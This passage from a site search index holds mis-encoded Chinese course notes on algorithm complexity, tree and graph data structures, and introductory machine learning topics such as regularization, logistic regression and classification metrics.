è±å§†å¾·Â·èµ›å¾·å°”çš„ä¸‰è§’åˆ†å‰²å¤šè¾¹å½¢ç®—æ³•   çº¿æ€§å¯¹æ•°æ—¶é—´ $${\\displaystyle O(n\\log n)}$$ æœ€å¿«çš„æ¯”è¾ƒæ’åº   äºŒæ¬¡æ—¶é—´ $${\\displaystyle O(n^{2})}$$ å†’æ³¡æ’åºã€æ’å…¥æ’åº   ä¸‰æ¬¡æ—¶é—´ $${\\displaystyle O(n^{3})}$$ çŸ©é˜µä¹˜æ³•çš„åŸºæœ¬å®ç°ï¼Œè®¡ç®—éƒ¨åˆ†ç›¸å…³æ€§   å¤šé¡¹å¼æ—¶é—´ $${\\displaystyle 2^{O(\\log n)}=n^{O(1)}}$$ çº¿æ€§è§„åˆ’ä¸­çš„å¡é©¬å¡ç®—æ³•ï¼ŒAKS è´¨æ•°æµ‹è¯•   å‡†å¤šé¡¹å¼æ—¶é—´ $${\\displaystyle 2^{(\\log n)^{O(1)}}}$$ å…³äºæœ‰å‘æ–¯å¦çº³æ ‘é—®é¢˜æœ€è‘—åçš„$${\\displaystyle O(\\log ^{2}n)}!O(\\log ^{2}n)$$è¿‘ä¼¼ç®—æ³•   æ¬¡æŒ‡æ•°æ—¶é—´ï¼ˆç¬¬ä¸€å®šä¹‰ï¼‰ $${\\displaystyle O(2^{n^{\\epsilon }})}$$å¯¹ä»»æ„çš„$$\\epsilon \u0026gt; 0â€‹$$ å‡è®¾å¤æ‚æ€§ç†è®ºæ¨æµ‹ã€‚   æ¬¡æŒ‡æ•°æ—¶é—´ï¼ˆç¬¬äºŒå®šä¹‰ï¼‰ $$2^{o(n)}$$ ç”¨äºæ•´æ•°åˆ†è§£ä¸å›¾å½¢åŒæ„é—®é¢˜çš„è‘—åç®—æ³•   æŒ‡æ•°æ—¶é—´ $$2^{O(n)}$$ ä½¿ç”¨åŠ¨æ€è§„åˆ’è§£å†³æ—…è¡Œæ¨é”€å‘˜é—®é¢˜   é˜¶ä¹˜æ—¶é—´ $$O(n!)$$ é€šè¿‡æš´åŠ›æœç´¢è§£å†³æ—…è¡Œæ¨é”€å‘˜é—®é¢˜   æŒ‡æ•°æ—¶é—´ $$2^{poly(n)}$$    åŒé‡æŒ‡æ•°æ—¶é—´ $$2^{2poly(n)}$$ åœ¨é¢„è†¨èƒ€ç®—æœ¯ä¸­å†³å®šä¸€ä¸ªç»™å®šæè¿°çš„çœŸå®æ€§    2. è¡¨ç»“æ„ #  3. æ ‘ç»“æ„ #  æ¦‚å¿µï¼š\n  æ ‘çš„é«˜åº¦æˆ–æ·±åº¦ï¼šä»æ ‘çš„æ ¹èŠ‚ç‚¹å¼€å§‹åˆ°æ‰€æœ‰å¶å­ç»“ç‚¹ä¸­ï¼Œæœ€é•¿è·¯å¾„ä¸­çš„ç»“ç‚¹ä¸ªæ•°ï¼›\n  åº¦ï¼š\n æ ‘ä¸­ä¸€ä¸ªå…ƒç´ çš„åº¦æ˜¯æŒ‡å…¶å­©å­çš„ä¸ªæ•°ï¼› æ ‘æœ¬èº«çš„åº¦æ˜¯æŒ‡å…¶ä¸­æ‰€æœ‰å…ƒç´ åº¦çš„æœ€å¤§å€¼ã€‚    æ»¡äºŒå‰æ ‘ï¼šé«˜åº¦ä¸º hï¼Œå«æœ‰ $$2^h - 1$$ ä¸ªå…ƒç´ çš„äºŒå‰æ ‘ã€‚\n  å®Œå…¨äºŒå‰æ ‘ï¼šé¡ºåºç¼–å·åï¼Œ$$1 \\le i \\le n$$ çš„ç»“ç‚¹ i å­˜åœ¨ç»“ç‚¹ï¼Œ$$n \\lt i \\le 2^h - 1$$ çš„ç»“ç‚¹ i å‡ä¸ºç©ºçš„äºŒå‰æ ‘ã€‚\n  4. å›¾ç»“æ„ #  æ¦‚å¿µï¼š\né¡¶ç‚¹ã€è¾¹ã€æ— å‘è¾¹ã€æœ‰å‘è¾¹ã€å…³è”äºã€å…³è”è‡³ã€é‚»æ¥äºã€é‚»æ¥è‡³ã€æ— å‘å›¾ã€æœ‰å‘å›¾ã€å®Œå…¨å›¾ã€ç¨€ç–å›¾ã€ç¨ å¯†å›¾ã€å¸¦æƒå›¾ã€å­å›¾ã€é¡¶ç‚¹çš„åº¦ã€å…¥åº¦ã€å‡ºåº¦ã€è·¯å¾„ã€è·¯å¾„é•¿åº¦ã€ç®€å•è·¯å¾„ã€å›è·¯ã€è¿é€šå›¾ã€è¿é€šåˆ†é‡ã€å¼ºè¿é€šå›¾ã€å¼ºè¿é€šåˆ†é‡ã€ç”Ÿæˆæ ‘ã€ç”Ÿæˆæ£®æ—ã€‚\n"},{"id":318,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/searchtree/","title":"Search Tree","section":"æ•°æ®ç»“æ„","content":"æœç´¢æ ‘ #  äºŒå‰æœç´¢æ ‘ BST #  æ»¡è¶³ä»¥ä¸‹ç‰¹æ€§çš„äºŒå‰æ ‘æ˜¯æ£µäºŒå‰æœç´¢æ ‘ï¼ˆBinary Search Treeï¼‰ï¼š\n æ¯ä¸ªå…ƒç´ æœ‰ä¸€ä¸ªå…³é”®å­—ï¼Œå¹¶ä¸”ä»»æ„ä¸¤ä¸ªå…ƒç´ çš„å…³é”®å­—éƒ½ä¸åŒï¼›å› æ­¤æ‰€æœ‰å…³é”®å­—éƒ½æ˜¯å”¯ä¸€çš„ï¼› åœ¨æ ¹èŠ‚ç‚¹çš„å·¦å­æ ‘ä¸­ï¼Œå…ƒç´ çš„å…³é”®å­—ï¼ˆå¦‚æœæœ‰çš„è¯ï¼‰éƒ½å°äºæ ¹èŠ‚ç‚¹çš„å…³é”®å­—ï¼› åœ¨æ ¹èŠ‚ç‚¹çš„å³å­æ ‘ä¸­ï¼Œå…ƒç´ çš„å…³é”®å­—ï¼ˆå¦‚æœæœ‰çš„è¯ï¼‰éƒ½å¤§äºæ ¹èŠ‚ç‚¹çš„å…³é”®å­—ï¼› æ ¹èŠ‚ç‚¹çš„å·¦å³å­æ ‘ä¹Ÿéƒ½æ˜¯äºŒå‰æœç´¢æ ‘ã€‚  AVL æœç´¢æ ‘ #  AVL æ ‘æ˜¯ Adelson-Velskii å’Œ Landis åœ¨ 1962 å¹´æå‡ºçš„ï¼š\n AVL æœç´¢æ ‘æ˜¯ä¸€æ£µäºŒå‰æœç´¢æ ‘ å·¦å³å­æ ‘çš„é«˜åˆ†åˆ«ä¸º $$h_L, h_R$$ï¼Œåˆ™ AVL æœç´¢æ ‘æœ‰ï¼š$$|h_L - h_R| \\le 1$$ AVL æœç´¢æ ‘æ ¹èŠ‚ç‚¹çš„å·¦å­æ ‘å’Œå³å­æ ‘ä¹Ÿæ˜¯ AVL æœç´¢æ ‘ã€‚  çº¢é»‘æ ‘ #  çº¢é»‘æ ‘ï¼š\n çº¢é»‘æ ‘æ˜¯ä¸€ä¸ªå¸¦æœ‰é¢œè‰²çš„äºŒå‰æŸ¥æ‰¾æ ‘ï¼Œæ‰€æœ‰ç»“ç‚¹å‡æ˜¯çº¢è‰²æˆ–é»‘è‰²ï¼› æ ¹æ˜¯é»‘è‰²ï¼› æ‰€æœ‰å¶å­éƒ½æ˜¯é»‘è‰²ï¼ˆå¶å­ç»“ç‚¹æ˜¯å¤–éƒ¨ç»“ç‚¹ï¼‰ï¼› æ¯ä¸ªçº¢è‰²ç»“ç‚¹å¿…é¡»æœ‰ä¸¤ä¸ªé»‘è‰²ç»“ç‚¹ï¼› ä»ä»»ä¸€èŠ‚ç‚¹åˆ°å…¶æ¯ä¸ªå¶å­çš„ç®€å•è·¯å¾„éƒ½åŒ…å«ç›¸åŒæ•°é‡çš„é»‘è‰²ç»“ç‚¹ã€‚  B-æ ‘ #  æ ¹æ® Knuth çš„å®šä¹‰ï¼Œä¸€ä¸ª m é˜¶çš„Bæ ‘æ˜¯ä¸€ä¸ªæœ‰ä»¥ä¸‹å±æ€§çš„æ ‘ï¼š\n æ¯ä¸ªèŠ‚ç‚¹æœ€å¤šæœ‰ m ä¸ªå­èŠ‚ç‚¹ï¼› æ¯ä¸ªéå¶å­èŠ‚ç‚¹ï¼ˆé™¤æ ¹èŠ‚ç‚¹ï¼‰æœ€å°‘æœ‰ $$\\displaystyle [\\frac{m}{2}] $$ ä¸ªå­èŠ‚ç‚¹ï¼› å¦‚æœæ ¹èŠ‚ç‚¹ä¸æ˜¯å¶å­èŠ‚ç‚¹ï¼Œé‚£ä¹ˆå®ƒè‡³å°‘æœ‰ä¸¤ä¸ªå­èŠ‚ç‚¹ï¼› æœ‰ k ä¸ªå­èŠ‚ç‚¹çš„éå¶å­èŠ‚ç‚¹æ‹¥æœ‰ k âˆ’ 1 ä¸ªé”®ï¼› æ‰€æœ‰çš„å¶å­èŠ‚ç‚¹éƒ½åœ¨åŒä¸€å±‚ã€‚  "},{"id":319,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E5%BF%AB%E9%80%9F%E5%85%A5%E9%97%A8%E6%95%99%E7%A8%8B/1.framing/","title":"1. Framing","section":"æœºå™¨å­¦ä¹ å¿«é€Ÿå…¥é—¨æ•™ç¨‹","content":"é—®é¢˜æ„å»º #  ä¸»è¦æœ¯è¯­ï¼Œå…¨éƒ¨ã€‚\næ ‡ç­¾ #  æ ‡ç­¾æ˜¯æˆ‘ä»¬è¦é¢„æµ‹çš„äº‹ç‰©ï¼Œå³ç®€å•çº¿æ€§å›å½’ä¸­çš„ y å˜é‡ã€‚\næ ‡ç­¾å¯ä»¥æ˜¯å°éº¦æœªæ¥çš„ä»·æ ¼ã€å›¾ç‰‡ä¸­æ˜¾ç¤ºçš„åŠ¨ç‰©å“ç§ã€éŸ³é¢‘å‰ªè¾‘çš„å«ä¹‰æˆ–ä»»ä½•äº‹ç‰©ã€‚\nç‰¹å¾ #  ç‰¹å¾æ˜¯è¾“å…¥å˜é‡ï¼Œå³ç®€å•çº¿æ€§å›å½’ä¸­çš„ x å˜é‡ã€‚ç®€å•çš„æœºå™¨å­¦ä¹ é¡¹ç›®å¯èƒ½ä¼šä½¿ç”¨å•ä¸ªç‰¹å¾ï¼Œè€Œæ¯”è¾ƒå¤æ‚çš„æœºå™¨å­¦ä¹ é¡¹ç›®å¯èƒ½ä¼šä½¿ç”¨æ•°ç™¾ä¸‡ä¸ªç‰¹å¾ï¼ŒæŒ‰å¦‚ä¸‹æ–¹å¼æŒ‡å®šï¼š$$x_1, x_2, \u0026hellip; x_n$$\næ ·æœ¬ #  æ ·æœ¬æ˜¯æŒ‡æ•°æ®çš„ç‰¹å®šå®ä¾‹ï¼šxã€‚ï¼ˆæˆ‘ä»¬é‡‡ç”¨ç²—ä½“ x è¡¨ç¤ºå®ƒæ˜¯ä¸€ä¸ªçŸ¢é‡ã€‚ï¼‰æˆ‘ä»¬å°†æ ·æœ¬åˆ†ä¸ºä»¥ä¸‹ä¸¤ç±»ï¼šæœ‰æ ‡ç­¾æ ·æœ¬ã€æ— æ ‡ç­¾æ ·æœ¬\n  æœ‰æ ‡ç­¾æ ·æœ¬åŒæ—¶åŒ…å«ç‰¹å¾å’Œæ ‡ç­¾ã€‚å³ï¼š\nlabeled examples: {features, label}: (x, y) æˆ‘ä»¬ä½¿ç”¨æœ‰æ ‡ç­¾æ ·æœ¬æ¥è®­ç»ƒæ¨¡å‹ã€‚åœ¨æˆ‘ä»¬çš„åƒåœ¾é‚®ä»¶æ£€æµ‹å™¨ç¤ºä¾‹ä¸­ï¼Œæœ‰æ ‡ç­¾æ ·æœ¬æ˜¯ç”¨æˆ·æ˜ç¡®æ ‡è®°ä¸º â€œåƒåœ¾é‚®ä»¶â€ æˆ– â€œéåƒåœ¾é‚®ä»¶â€ çš„å„ä¸ªç”µå­é‚®ä»¶ã€‚\n  æ— æ ‡ç­¾æ ·æœ¬åŒ…å«ç‰¹å¾ï¼Œä½†ä¸åŒ…å«æ ‡ç­¾ã€‚å³ï¼š\nunlabeled examples: {features, ?}: (x, ?)   åœ¨ä½¿ç”¨æœ‰æ ‡ç­¾æ ·æœ¬è®­ç»ƒæ¨¡å‹ä¹‹åï¼Œæˆ‘ä»¬ä¼šä½¿ç”¨è¯¥æ¨¡å‹é¢„æµ‹æ— æ ‡ç­¾æ ·æœ¬çš„æ ‡ç­¾ã€‚åœ¨åƒåœ¾é‚®ä»¶æ£€æµ‹å™¨ç¤ºä¾‹ä¸­ï¼Œæ— æ ‡ç­¾æ ·æœ¬æ˜¯ç”¨æˆ·å°šæœªæ·»åŠ æ ‡ç­¾çš„æ–°ç”µå­é‚®ä»¶ã€‚\næ¨¡å‹ #  æ¨¡å‹å®šä¹‰äº†ç‰¹å¾ä¸æ ‡ç­¾ä¹‹é—´çš„å…³ç³»ã€‚\næ¨¡å‹ç”Ÿå‘½å‘¨æœŸçš„ä¸¤ä¸ªé˜¶æ®µï¼š\n è®­ç»ƒæ˜¯æŒ‡åˆ›å»ºæˆ–å­¦ä¹ æ¨¡å‹ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œå‘æ¨¡å‹å±•ç¤ºæœ‰æ ‡ç­¾æ ·æœ¬ï¼Œè®©æ¨¡å‹é€æ¸å­¦ä¹ ç‰¹å¾ä¸æ ‡ç­¾ä¹‹é—´çš„å…³ç³»ã€‚ æ¨æ–­æ˜¯æŒ‡å°†è®­ç»ƒåçš„æ¨¡å‹åº”ç”¨äºæ— æ ‡ç­¾æ ·æœ¬ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œä½¿ç”¨ç»è¿‡è®­ç»ƒçš„æ¨¡å‹åšå‡ºæœ‰ç”¨çš„é¢„æµ‹ (y')ã€‚  å›å½’ä¸åˆ†ç±» #  å›å½’æ¨¡å‹å¯é¢„æµ‹è¿ç»­å€¼ã€‚ä¾‹å¦‚ï¼Œå›å½’æ¨¡å‹åšå‡ºçš„é¢„æµ‹å¯å›ç­”å¦‚ä¸‹é—®é¢˜ï¼š\n åŠ åˆ©ç¦å°¼äºšå·ä¸€æ ‹æˆ¿äº§çš„ä»·å€¼æ˜¯å¤šå°‘ï¼Ÿ ç”¨æˆ·ç‚¹å‡»æ­¤å¹¿å‘Šçš„æ¦‚ç‡æ˜¯å¤šå°‘ï¼Ÿ  åˆ†ç±»æ¨¡å‹å¯é¢„æµ‹ç¦»æ•£å€¼ã€‚ä¾‹å¦‚ï¼Œåˆ†ç±»æ¨¡å‹åšå‡ºçš„é¢„æµ‹å¯å›ç­”å¦‚ä¸‹é—®é¢˜ï¼š\n æŸä¸ªæŒ‡å®šç”µå­é‚®ä»¶æ˜¯åƒåœ¾é‚®ä»¶è¿˜æ˜¯éåƒåœ¾é‚®ä»¶ï¼Ÿ è¿™æ˜¯ä¸€å¼ ç‹—ã€çŒ«è¿˜æ˜¯ä»“é¼ å›¾ç‰‡ï¼Ÿ  æ€»ç»“ #  å…³é”®å­—è¯æ€»ç»“ï¼š\nåˆ†ç±»æ¨¡å‹ã€æ ·æœ¬ã€ç‰¹å¾ã€æ¨æ–­ã€æ ‡ç­¾ã€æ¨¡å‹ã€å›å½’æ¨¡å‹ã€è®­ç»ƒ\n"},{"id":320,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E5%BF%AB%E9%80%9F%E5%85%A5%E9%97%A8%E6%95%99%E7%A8%8B/10.regularization/","title":"10. Regularization","section":"æœºå™¨å­¦ä¹ å¿«é€Ÿå…¥é—¨æ•™ç¨‹","content":"æ­£åˆ™åŒ– #  æ¦‚è¿° #  é™ä½å¤æ‚æ¨¡å‹çš„å¤æ‚åº¦æ¥é˜²æ­¢è¿‡æ‹Ÿåˆï¼Œè¿™ç§åŸåˆ™ç§°ä¸ºæ­£åˆ™åŒ–ã€‚\nä¹Ÿå°±æ˜¯è¯´ï¼Œå¹¶éåªæ˜¯ä»¥æœ€å°åŒ–æŸå¤±ï¼ˆç»éªŒé£é™©æœ€å°åŒ–ï¼‰ä¸ºç›®æ ‡ï¼š$$minimize(Loss(Data[Model]))$$\nè€Œæ˜¯ä»¥æœ€å°åŒ–æŸå¤±å’Œå¤æ‚åº¦ä¸ºç›®æ ‡ï¼Œè¿™ç§°ä¸ºç»“æ„é£é™©æœ€å°åŒ–ï¼š$$minimize(Loss(Data[Model]) + complexity(Model))$$\nç°åœ¨ï¼Œæˆ‘ä»¬çš„è®­ç»ƒä¼˜åŒ–ç®—æ³•æ˜¯ä¸€ä¸ªç”±ä¸¤é¡¹å†…å®¹ç»„æˆçš„å‡½æ•°ï¼š\n ä¸€ä¸ªæ˜¯æŸå¤±é¡¹ï¼Œç”¨äºè¡¡é‡æ¨¡å‹ä¸æ•°æ®çš„æ‹Ÿåˆåº¦ï¼› å¦ä¸€ä¸ªæ˜¯æ­£åˆ™åŒ–é¡¹ï¼Œç”¨äºè¡¡é‡æ¨¡å‹å¤æ‚åº¦ã€‚  æœºå™¨å­¦ä¹ é€Ÿæˆè¯¾ç¨‹é‡ç‚¹ä»‹ç»äº†ä¸¤ç§è¡¡é‡æ¨¡å‹å¤æ‚åº¦çš„å¸¸è§æ–¹å¼ï¼ˆè¿™ä¸¤ç§æ–¹å¼æœ‰äº›ç›¸å…³ï¼‰ï¼š\n å°†æ¨¡å‹å¤æ‚åº¦ä½œä¸ºæ¨¡å‹ä¸­æ‰€æœ‰ç‰¹å¾çš„æƒé‡çš„å‡½æ•°ã€‚ å°†æ¨¡å‹å¤æ‚åº¦ä½œä¸ºå…·æœ‰éé›¶æƒé‡çš„ç‰¹å¾æ€»æ•°çš„å‡½æ•°ã€‚ï¼ˆåé¢çš„ä¸€ä¸ªå•å…ƒä»‹ç»äº†è¿™ç§æ–¹æ³•ã€‚ï¼‰  å¦‚æœæ¨¡å‹å¤æ‚åº¦æ˜¯æƒé‡çš„å‡½æ•°ï¼Œåˆ™ç‰¹å¾æƒé‡çš„ç»å¯¹å€¼è¶Šé«˜ï¼Œå¯¹æ¨¡å‹å¤æ‚åº¦çš„è´¡çŒ®å°±è¶Šå¤§ã€‚\nL2 æ­£åˆ™åŒ– #  æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ L2 æ­£åˆ™åŒ– å…¬å¼æ¥é‡åŒ–å¤æ‚åº¦ï¼Œè¯¥å…¬å¼å°†æ­£åˆ™åŒ–é¡¹å®šä¹‰ä¸ºæ‰€æœ‰ç‰¹å¾æƒé‡çš„å¹³æ–¹å’Œï¼š\n$$L_2\\ regularization\\ term=||w||^2_2=w_1^2+w_2^2+\u0026hellip;+w_n^2$$\nåœ¨è¿™ä¸ªå…¬å¼ä¸­ï¼Œæ¥è¿‘äº 0 çš„æƒé‡å¯¹æ¨¡å‹å¤æ‚åº¦å‡ ä¹æ²¡æœ‰å½±å“ï¼Œè€Œç¦»ç¾¤å€¼æƒé‡åˆ™å¯èƒ½ä¼šäº§ç”Ÿå·¨å¤§çš„å½±å“ã€‚\nç®€åŒ–æ­£åˆ™åŒ– lambda #  æ¨¡å‹å¼€å‘è€…é€šè¿‡ä»¥ä¸‹æ–¹å¼æ¥è°ƒæ•´æ­£åˆ™åŒ–é¡¹çš„æ•´ä½“å½±å“ï¼šç”¨æ­£åˆ™åŒ–é¡¹çš„å€¼ä¹˜ä»¥åä¸º lambdaï¼ˆåˆç§°ä¸ºæ­£åˆ™åŒ–ç‡ï¼‰çš„æ ‡é‡ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œæ¨¡å‹å¼€å‘è€…ä¼šæ‰§è¡Œä»¥ä¸‹è¿ç®—ï¼š\n$$minimize(Loss(Data[Model]) + \\lambda complexity(Model))$$\nåœ¨é€‰æ‹© lambda å€¼æ—¶ï¼Œç›®æ ‡æ˜¯åœ¨ç®€å•åŒ–å’Œè®­ç»ƒæ•°æ®æ‹Ÿåˆä¹‹é—´è¾¾åˆ°é€‚å½“çš„å¹³è¡¡ï¼š\n å¦‚æœæ‚¨çš„ lambda å€¼è¿‡é«˜ï¼Œåˆ™æ¨¡å‹ä¼šéå¸¸ç®€å•ï¼Œä½†æ˜¯æ‚¨å°†é¢ä¸´æ•°æ®æ¬ æ‹Ÿåˆçš„é£é™©ã€‚æ‚¨çš„æ¨¡å‹å°†æ— æ³•ä»è®­ç»ƒæ•°æ®ä¸­è·å¾—è¶³å¤Ÿçš„ä¿¡æ¯æ¥åšå‡ºæœ‰ç”¨çš„é¢„æµ‹ã€‚ å¦‚æœæ‚¨çš„ lambda å€¼è¿‡ä½ï¼Œåˆ™æ¨¡å‹ä¼šæ¯”è¾ƒå¤æ‚ï¼Œå¹¶ä¸”æ‚¨å°†é¢ä¸´æ•°æ®è¿‡æ‹Ÿåˆçš„é£é™©ã€‚æ‚¨çš„æ¨¡å‹å°†å› è·å¾—è¿‡å¤šè®­ç»ƒæ•°æ®ç‰¹ç‚¹æ–¹é¢çš„ä¿¡æ¯è€Œæ— æ³•æ³›åŒ–åˆ°æ–°æ•°æ®ã€‚  æ³¨æ„ï¼šå°† lambda è®¾ä¸º 0 å¯å½»åº•å–æ¶ˆæ­£åˆ™åŒ–ã€‚ åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œè®­ç»ƒçš„å”¯ä¸€ç›®çš„å°†æ˜¯æœ€å°åŒ–æŸå¤±ï¼Œè€Œè¿™æ ·åšä¼šä½¿è¿‡æ‹Ÿåˆçš„é£é™©è¾¾åˆ°æœ€é«˜ã€‚\nç†æƒ³çš„ lambda å€¼ç”Ÿæˆçš„æ¨¡å‹å¯ä»¥å¾ˆå¥½åœ°æ³›åŒ–åˆ°ä»¥å‰æœªè§è¿‡çš„æ–°æ•°æ®ã€‚ é—æ†¾çš„æ˜¯ï¼Œç†æƒ³çš„ lambda å€¼å–å†³äºæ•°æ®ï¼Œå› æ­¤æ‚¨éœ€è¦æ‰‹åŠ¨æˆ–è‡ªåŠ¨è¿›è¡Œä¸€äº›è°ƒæ•´ã€‚\nå…³é”®è¯ #  æ³›åŒ–æ›²çº¿ã€L2 æ­£åˆ™åŒ–ã€è¿‡æ‹Ÿåˆã€æ­£åˆ™åŒ–ã€ç»“æ„é£é™©æœ€å°åŒ–ã€æ—©åœæ³•ã€lambdaã€æ­£åˆ™åŒ–ç‡\n"},{"id":321,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E5%BF%AB%E9%80%9F%E5%85%A5%E9%97%A8%E6%95%99%E7%A8%8B/11.logisticregression/","title":"11. Logistic Regression","section":"æœºå™¨å­¦ä¹ å¿«é€Ÿå…¥é—¨æ•™ç¨‹","content":"é€»è¾‘å›å½’ #  è®¡ç®—æ¦‚ç‡ #  è®¸å¤šé—®é¢˜éœ€è¦å°†æ¦‚ç‡ä¼°ç®—å€¼ä½œä¸ºè¾“å‡ºã€‚é€»è¾‘å›å½’æ˜¯ä¸€ç§æå…¶é«˜æ•ˆçš„æ¦‚ç‡è®¡ç®—æœºåˆ¶ã€‚\nS å‹å‡½æ•°ï¼š\n ä¸€ä¸ªå€¼åŸŸæ°å¥½åœ¨ 0 åˆ° 1 ä¹‹é—´çš„å‡½æ•°ï¼Œå®šä¹‰ä¸ºï¼š$$\\displaystyle y = \\frac{1}{1 + e^{-z}}$$  z è¡¨ç¤ºä½¿ç”¨é€»è¾‘å›å½’è®­ç»ƒçš„æ¨¡å‹çš„çº¿æ€§å±‚çš„è¾“å‡ºã€‚\næŸå¤±å‡½æ•° #  çº¿æ€§å›å½’çš„æŸå¤±å‡½æ•°æ˜¯å¹³æ–¹æŸå¤±ã€‚é€»è¾‘å›å½’çš„æŸå¤±å‡½æ•°æ˜¯å¯¹æ•°æŸå¤±å‡½æ•°ï¼Œå®šä¹‰å¦‚ä¸‹ï¼š\n$$\\displaystyle Log Loss = \\sum_{(x,y)\\in D} -ylog(y\u0026rsquo;) - (1 - y)log(1 - y\u0026rsquo;)â€‹$$\nå…¶ä¸­ï¼š\n $$(x, y) \\in D$$ æ˜¯åŒ…å«å¾ˆå¤šæœ‰æ ‡ç­¾æ ·æœ¬ (x,y) çš„æ•°æ®é›†ã€‚ â€œyâ€æ˜¯æœ‰æ ‡ç­¾æ ·æœ¬ä¸­çš„æ ‡ç­¾ã€‚ç”±äºè¿™æ˜¯é€»è¾‘å›å½’ï¼Œå› æ­¤ â€œyâ€ çš„æ¯ä¸ªå€¼å¿…é¡»æ˜¯ 0 æˆ– 1ã€‚ â€œy\u0026rsquo;â€æ˜¯å¯¹äºç‰¹å¾é›†â€œxâ€çš„é¢„æµ‹å€¼ï¼ˆä»‹äº 0 å’Œ 1 ä¹‹é—´ï¼‰ã€‚  æ­£åˆ™åŒ– #  æ­£åˆ™åŒ–åœ¨é€»è¾‘å›å½’å»ºæ¨¡ä¸­æå…¶é‡è¦ã€‚å¦‚æœæ²¡æœ‰æ­£åˆ™åŒ–ï¼Œé€»è¾‘å›å½’çš„æ¸è¿‘æ€§ä¼šä¸æ–­ä¿ƒä½¿æŸå¤±åœ¨é«˜ç»´åº¦ç©ºé—´å†…è¾¾åˆ° 0ã€‚å› æ­¤ï¼Œå¤§å¤šæ•°é€»è¾‘å›å½’æ¨¡å‹ä¼šä½¿ç”¨ä»¥ä¸‹ä¸¤ä¸ªç­–ç•¥ä¹‹ä¸€æ¥é™ä½æ¨¡å‹å¤æ‚æ€§ï¼š\n L2 æ­£åˆ™åŒ–ã€‚ æ—©åœæ³•ï¼Œå³ï¼Œé™åˆ¶è®­ç»ƒæ­¥æ•°æˆ–å­¦ä¹ é€Ÿç‡ã€‚  "},{"id":322,"href":"/docs/%E7%B3%BB%E7%BB%9F%E7%90%86%E8%AE%BA%E8%AF%BE%E7%A8%8B/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E5%BF%AB%E9%80%9F%E5%85%A5%E9%97%A8%E6%95%99%E7%A8%8B/12.classification/","title":"12. Classification","section":"æœºå™¨å­¦ä¹ å¿«é€Ÿå…¥é—¨æ•™ç¨‹","content":"åˆ†ç±» #  é˜ˆå€¼ #  ä¸ºäº†å°†é€»è¾‘å›å½’å€¼æ˜ å°„åˆ°äºŒå…ƒç±»åˆ«ï¼Œæ‚¨å¿…é¡»æŒ‡å®šåˆ†ç±»é˜ˆå€¼ï¼ˆä¹Ÿç§°ä¸ºåˆ¤å®šé˜ˆå€¼ï¼‰ã€‚\nå‡†ç¡®ç‡ #  æˆ‘ä»¬å‡è®¾ï¼š\n    $$H_0$$ æˆç«‹ $$H_1$$ æˆç«‹     æ¥æ”¶ ä¸çŠ¯é”™ï¼ˆTPï¼‰ ç¬¬ II ç±»é”™è¯¯ï¼ˆå–ä¼ªé”™è¯¯ FPï¼‰   æ‹’ç» ç¬¬ I ç±»é”™è¯¯ï¼ˆå¼ƒçœŸé”™è¯¯ FNï¼‰ ä¸çŠ¯é”™ï¼ˆTNï¼‰    å‡†ç¡®ç‡æ˜¯æŒ‡æˆ‘ä»¬çš„æ¨¡å‹é¢„æµ‹æ­£ç¡®çš„ç»“æœæ‰€å çš„æ¯”ä¾‹ï¼š\n $$\\displaystyle \\text{Accuracy} = \\frac{\\text{Number of correct predictions}}{\\text{Total number of predictions}}$$  å¯¹äºäºŒå…ƒåˆ†ç±»ï¼Œä¹Ÿå¯ä»¥æ ¹æ®æ­£ç±»åˆ«å’Œè´Ÿç±»åˆ«æŒ‰å¦‚ä¸‹æ–¹å¼è®¡ç®—å‡†ç¡®ç‡ï¼š\n $$\\displaystyle \\text{Accuracy} = \\frac{TP+TN}{TP+TN+FP+FN}$$  å½“æ‚¨ä½¿ç”¨åˆ†ç±»ä¸å¹³è¡¡çš„æ•°æ®é›†ï¼ˆæ¯”å¦‚æ­£ç±»åˆ«æ ‡ç­¾å’Œè´Ÿç±»åˆ«æ ‡ç­¾çš„æ•°é‡ä¹‹é—´å­˜åœ¨æ˜æ˜¾å·®å¼‚ï¼‰æ—¶ï¼Œå•å•å‡†ç¡®ç‡ä¸€é¡¹å¹¶ä¸èƒ½åæ˜ å…¨é¢æƒ…å†µã€‚\nç²¾ç¡®ç‡å’Œå¬å›ç‡ #  ç²¾ç¡®ç‡çš„å®šä¹‰å¦‚ä¸‹ï¼š$$\\displaystyle \\text{Precision} = \\frac{TP}{TP+FP}$$\nä»æ•°å­¦ä¸Šè®²ï¼Œå¬å›ç‡çš„å®šä¹‰å¦‚ä¸‹ï¼š$$\\displaystyle \\text{å¬å›ç‡} = \\frac{TP}{TP+FN}$$\nè¦å…¨é¢è¯„ä¼°æ¨¡å‹çš„æœ‰æ•ˆæ€§ï¼Œå¿…é¡»åŒæ—¶æ£€æŸ¥ç²¾ç¡®ç‡å’Œå¬å›ç‡ã€‚é—æ†¾çš„æ˜¯ï¼Œç²¾ç¡®ç‡å’Œå¬å›ç‡å¾€å¾€æ˜¯æ­¤æ¶ˆå½¼é•¿çš„æƒ…å†µã€‚\næˆ‘ä»¬å·²æ ¹æ®ç²¾ç¡®ç‡å’Œå¬å›ç‡æŒ‡æ ‡åˆ¶å®šäº†å„ç§æŒ‡æ ‡ã€‚æœ‰å…³ç¤ºä¾‹ï¼Œè¯·å‚é˜… F1 å€¼ã€‚\nROC æ›²çº¿ #  ROC 